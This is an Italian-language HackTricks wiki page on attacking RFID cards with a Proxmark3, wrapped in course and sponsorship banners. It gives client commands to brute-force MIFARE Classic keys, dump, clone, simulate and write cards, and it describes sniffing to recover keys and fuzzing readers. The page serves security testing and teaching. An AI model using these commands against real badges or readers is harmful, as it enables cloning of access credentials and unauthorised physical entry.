# Proxmark 3

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Attaccare i sistemi RFID con Proxmark3

La prima cosa che devi fare è avere un [**Proxmark3**](https://proxmark.com) e [**installare il software e le sue dipendenze**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Attaccare MIFARE Classic 1KB

Ha **16 settori**, ognuno dei quali ha **4 blocchi** e ogni blocco contiene **16B**. L'UID si trova nel settore 0 blocco 0 (e non può essere modificato).\
Per accedere a ciascun settore hai bisogno di **2 chiavi** (**A** e **B**) che sono memorizzate in **blocco 3 di ciascun settore** (settore trailer). Il settore trailer memorizza anche i **bit di accesso** che forniscono i permessi di **lettura e scrittura** su **ciascun blocco** utilizzando le 2 chiavi.\
2 chiavi sono utili per dare permessi di lettura se conosci la prima e di scrittura se conosci la seconda (ad esempio).

Possono essere eseguiti diversi attacchi.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Il Proxmark3 consente di eseguire altre azioni come **eavesdropping** una **comunicazione Tag a Reader** per cercare di trovare dati sensibili. In questa scheda potresti semplicemente sniffare la comunicazione e calcolare la chiave utilizzata perché le **operazioni crittografiche utilizzate sono deboli** e conoscendo il testo in chiaro e il testo cifrato puoi calcolarla (strumento `mfkey64`).

### Comandi Grezzi

I sistemi IoT a volte utilizzano **tag non marchiati o non commerciali**. In questo caso, puoi utilizzare Proxmark3 per inviare **comandi grezzi personalizzati ai tag**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Con queste informazioni potresti cercare informazioni sulla scheda e sul modo di comunicare con essa. Proxmark3 consente di inviare comandi raw come: `hf 14a raw -p -b 7 26`

### Scripts

Il software Proxmark3 viene fornito con un elenco precaricato di **script di automazione** che puoi utilizzare per eseguire semplici attività. Per recuperare l'elenco completo, utilizza il comando `script list`. Successivamente, utilizza il comando `script run`, seguito dal nome dello script:
```
proxmark3> script run mfkeys
```
Puoi creare uno script per **fuzz tag readers**, quindi copiando i dati di una **valid card** basta scrivere un **Lua script** che **randomizza** uno o più **bytes** casuali e controlla se il **reader crashes** con qualsiasi iterazione.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
